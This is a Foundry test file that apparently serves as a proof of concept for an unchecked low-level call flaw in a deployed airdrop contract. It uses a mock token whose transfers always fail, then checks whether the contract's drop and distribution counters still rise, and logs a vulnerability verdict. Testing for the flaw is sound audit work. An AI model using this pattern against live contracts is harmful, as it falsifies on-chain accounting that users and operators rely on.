// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe894d54dca59cb53fe9cbc5155093605c7068220.sol";

contract MockToken {
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false; // Always fail the transfer
    }
}

contract AirDropTest is Test {
    airDrop dropContract;
    MockToken mockToken;
    address owner = address(0x1);
    address user = address(0x2);
    address[] recipients;

    function setUp() public {
        vm.startPrank(owner);
        dropContract = new airDrop();
        mockToken = new MockToken();
        vm.stopPrank();

        // Setup recipients
        recipients.push(address(0x3));
        recipients.push(address(0x4));
    }

    function testUncheckedLowLevelCall() public {
        console.log("--- BEFORE-Trigger State ---");
        // Record initial state
        uint initialTotalDrops = dropContract.totalDrops();
        uint initialTotalTokensDistributed = dropContract.totalTokensDistributed();
        uint initialUserDropCount = dropContract.userDropCount(user);
        
        console.log("Initial totalDrops: %s", initialTotalDrops);
        console.log("Initial totalTokensDistributed: %s", initialTotalTokensDistributed);
        console.log("Initial userDropCount for %s: %s", user, initialUserDropCount);
        
        console.log("--- Trigger Transfer (Vulnerability Exploit) ---");
        // Attempt token transfer which will always fail
        vm.prank(user);
        bool result = dropContract.transfer(
            user,
            address(mockToken),
            recipients,
            100, // amount
            18   // decimals
        );
        console.log("Function returned:", result);

        console.log("--- AFTER-Trigger State ---");
        // Record post-trigger state
        uint finalTotalDrops = dropContract.totalDrops();
        uint finalTotalTokensDistributed = dropContract.totalTokensDistributed();
        uint finalUserDropCount = dropContract.userDropCount(user);
        
        console.log("Final totalDrops: %s", finalTotalDrops);
        console.log("Final totalTokensDistributed: %s", finalTotalTokensDistributed);
        console.log("Final userDropCount for %s: %s", user, finalUserDropCount);
        
        // Calculate expected incorrect token distribution 
        uint expectedDistribution = 100 * 10**18 * recipients.length;
        uint actualDistributionIncrease = finalTotalTokensDistributed - initialTotalTokensDistributed;
        
        console.log("--- State Change Analysis ---");
        bool dropsIncreased = finalTotalDrops == initialTotalDrops + 1;
        bool tokenDistributionIncreased = finalTotalTokensDistributed == initialTotalTokensDistributed + expectedDistribution;
        bool userCountIncreased = finalUserDropCount == initialUserDropCount + 1;
        
        console.log("TotalDrops increased (+1): %s", dropsIncreased ? "YES" : "NO");
        console.log("TokenDistribution increased (%s): %s", expectedDistribution, tokenDistributionIncreased ? "YES" : "NO");
        console.log("UserDropCount increased (+1): %s", userCountIncreased ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (dropsIncreased && tokenDistributionIncreased && userCountIncreased) {
            console.log("Vulnerability Exists: State variables updated despite failed token transfers");
        } else {
            console.log("Vulnerability not Exist: State remains unchanged after failed transfers");
        }
    }
}